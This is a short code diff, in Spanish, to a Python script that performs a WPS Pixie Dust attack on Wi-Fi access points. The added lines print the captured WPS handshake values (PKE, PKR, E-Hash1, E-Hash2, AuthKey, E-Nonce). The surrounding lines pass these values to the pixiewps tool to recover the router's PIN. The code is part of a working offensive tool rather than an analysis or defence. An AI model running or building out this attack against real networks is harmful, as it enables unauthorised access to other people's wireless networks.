@@ -97,6 +97,16 @@ def perform_pixie_dust_attack(interface, ssid):
         print("No se pudieron capturar los datos necesarios para el ataque Pixie Dust.")
         return
 
+    # Mostrar las claves capturadas
+    print("\n--- Claves capturadas ---")
+    print(f"PKE: {pke}")
+    print(f"PKR: {pkr}")
+    print(f"E-Hash1: {ehash1}")
+    print(f"E-Hash2: {ehash2}")
+    print(f"AuthKey: {authkey}")
+    print(f"E-Nonce: {enonce}")
+    print("-------------------------")
+
     # Ejecutar pixiewps con los valores capturados
     pixiewps_command = f"pixiewps -e {pke} -r {pkr} -s {ehash1} -z {ehash2} -a {authkey} -n {enonce} -vv"
     print(f"Ejecutando pixiewps: {pixiewps_command}")
@@ -172,6 +182,5 @@ def main():
 
 if __name__ == "__main__":
     main()
-
 
 
